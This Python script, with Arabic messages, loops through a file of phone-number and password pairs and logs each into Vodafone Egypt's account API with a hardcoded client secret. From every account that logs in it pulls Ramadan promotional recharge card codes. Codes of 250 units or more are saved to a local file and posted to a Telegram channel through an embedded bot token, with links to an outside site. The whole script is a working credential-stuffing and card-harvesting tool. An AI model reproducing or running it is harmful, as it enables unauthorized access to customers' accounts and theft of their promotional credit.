import requests
import time


file_path = "pro.txt"
message_idold = None

try:
    with open(file_path, "r") as f:
        accounts = f.readlines()
except FileNotFoundError:
    print("❌ الملف 'pro.txt' غير موجود. يرجى إنشاؤه وإضافة الحسابات بالشكل الصحيح.")
    exit()


while True:
    z = 0
    for line in accounts:
        try:
            line = line.strip()
            if not line or ":" not in line:
                continue 
            
            number, password = line.split(":")

            #print(f"\n🔄 تجربة الدخول بالحساب: {number}")

            url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive",
                "x-dynatrace": "MT_3_17_998679495_45-0_a556db1b-4506-43f3-854a-1d2527767923_0_18957_273",
                "x-agent-operatingsystem": "1630483957",
                "clientId": "AnaVodafoneAndroid",
                "x-agent-device": "RMX1911",
                "x-agent-version": "2021.12.2",
                "x-agent-build": "493",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "mobile.vodafone.com.eg",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.1"
            }

            data = {
                "username": number,
                "password": password,
                "grant_type": "password",
                "client_secret": "a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",
                "client_id": "my-vodafone-app"
            }

            res = requests.post(url, headers=headers, data=data)

            if res.status_code == 200:
                token = res.json().get("access_token", "")
                #print(f"✅ \033[1;32mLogin Successful: {number}")
                #print()

                hd2 = {
                    'Host': 'web.vodafone.com.eg',
                    'Connection': 'keep-alive',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'msisdn': number,
                    'api-host': 'PromotionHost',
                    'Accept-Language': 'AR',
                    'Authorization': 'Bearer ' + token,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'clientId': 'WebsiteConsumer',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-J610F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36',
                    'channel': 'WEB',
                    'X-Requested-With': 'com.emeint.android.myservices',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://web.vodafone.com.eg/spa/portal/hub',
                    'Accept-Encoding': 'gzip, deflate'
                }

                r2 = requests.get(f"https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion?@type=RamadanHub&channel=website&msisdn={number}", headers=hd2)

                if r2.status_code == 200:
                    z +=1
                    print(z)
                    s = r2.json()[1]['pattern']

                    for x in s:
                        amount = x['action'][0]['characteristics'][2]['value']
                        units = x['action'][0]['characteristics'][1]['value']
                        card = '*858*' + x['action'][0]['characteristics'][3]['value'] + '#'
                        crd = x['action'][0]['characteristics'][3]['value'] 
                        if float(units) >= 250:
                        	file_name = "cards.txt"
                        	with open(file_name, "r") as file:
                        		cards = file.read().splitlines()
                        	if card not in cards:	                        
		                        file_name = "cards.txt"
		                        with open(file_name, "a") as file:
		                        	file.write(card + "\n")
	
		                        print("\033[1;92m-" * 50)
		                        ms = f"""*Ramadan Kareem* 

💳 : [{card}](https://nobody7.xyz/call.php?code={crd})

• *Units :* {units}
• *Amount :* {amount}

🎗 *AJ VIP* 🎗"""
		                        print(ms)
		                        print("\033[1;92m-" * 50)
		                        bot_token = '7932347832:AAGcBqYS25Yvlk58qw91TbQ3oiTmzMMW32Q'
		                        #chat_id = '@adadxxbotx'
		                        chat_id = '@AJVIPX'
		                        message = ms
		                        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
		                        params = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
		                        response = requests.post(url, json=params)
		                        #print(response.text)
		                        message_id = response.json()['result']['message_id']
		                        if message_idold :
		                        	message_id = response.json()['result']['message_id']
		                        	delete_url = f'https://api.telegram.org/bot{bot_token}/deleteMessage'
		                        	delete_params = {'chat_id': chat_id, 'message_id': message_idold}
		                        	delete_response = requests.post(delete_url, json=delete_params)
		                        	#print(delete_response.text)
		                        message_idold = message_id           
	                
		                        
		                        
		                        
		                        
                else:
                    print("❌ فشل في جلب كروت رمضان.")
                    print(r2.text)

            else:
                print("❌ \033[1;31mNumper or Password Wrong")

            
            #time.sleep(2)

        except Exception as e:
            print(f"⚠️ حدث خطأ أثناء التجربة: {e}")
            continue 
    print('إعاده')